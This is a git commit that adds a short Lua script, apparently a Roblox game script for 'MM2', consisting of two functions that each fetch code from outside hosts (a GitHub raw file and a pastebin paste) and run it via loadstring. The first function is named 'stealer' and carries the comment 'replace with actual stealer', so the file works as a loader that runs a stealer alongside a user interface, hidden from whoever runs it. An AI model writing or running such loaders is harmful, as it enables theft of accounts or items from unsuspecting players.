95fb79452f0f75f022c289683ee7e9687b6c1e07
reiizarr7-tech <reiizarr7@gmail.com>
2025-10-04 00:52:19 +0630

    Create 1STFixedMM2.lua

---
+++ 1STFixedMM2.lua
@@ -0,0 +1,10 @@
+local function stealer()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reiizarr7-tech/redesigned-meme/refs/heads/main/SSS%2B.LUA"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://pastebin.com/raw/LW1RLRaF"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
